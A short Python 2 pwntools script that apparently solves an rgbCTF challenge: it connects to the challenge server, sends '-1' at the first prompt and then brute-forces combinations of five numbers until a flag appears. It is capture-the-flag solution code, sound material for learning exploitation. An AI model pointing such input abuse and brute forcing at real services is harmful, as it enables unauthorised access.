from pwn import *

p = remote('challenge.rgbsec.xyz', 7425)

print p.recvuntil('?')
p.sendline('-1')
arr = [1,2,3,4,5]

for a in arr:
    for b in arr:
        for c in arr:
            for d in arr:
                for e in arr:
                    rec = p.recvuntil(':\n')
                    print rec
                    if 'rgbCTF{' in rec:
                        break;
                    payload = str(a)+' '+str(b)+' '+str(c)+' '+str(d)+' '+str(e)
                    p.sendline(payload)
